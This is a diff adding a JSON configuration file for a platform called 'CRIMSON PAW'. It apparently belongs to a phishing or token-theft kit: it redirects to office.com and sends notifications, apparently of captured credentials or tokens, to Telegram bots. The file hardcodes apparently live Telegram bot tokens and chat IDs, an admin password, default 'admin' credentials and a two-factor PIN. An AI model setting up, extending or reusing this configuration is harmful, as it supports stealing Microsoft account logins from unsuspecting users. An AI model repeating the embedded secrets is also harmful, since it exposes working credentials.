@@ -1,0 +1,22 @@
+{
+    "platform_name": "CRIMSON PAW",
+    "default_redirect": "https://www.office.com/",
+    "deploy_host": "http://127.0.0.1:5000",
+    "refresh_threshold": 10,
+    "nc_user": "admin",
+    "nc_key": "admin",
+    "nc_ip": "",
+    "nc_env": "production",
+    "tg_bot_token": "8969682315:AAFcX748SNUsjXYj9OFM_g3zZJJ2w4Ljc7c",
+    "tg_chat_id": "7922291087",
+    "webhook_url": "",
+    "notify_token": true,
+    "kwa_tg_bot_token": "8886720333:AAHVCgk_jqQmNuGoGPPLnKVWQhgR5BKXczI",
+    "kwa_tg_chat_id": "7922291087",
+    "kwa_tg_enabled": true,
+    "admin_password": "Sysadmin",
+    "two_factor_method": "telegram",
+    "two_factor_enforcement": "enabled",
+    "two_factor_pin": "ALPHA-4404",
+    "client_admin_locked": false
+}
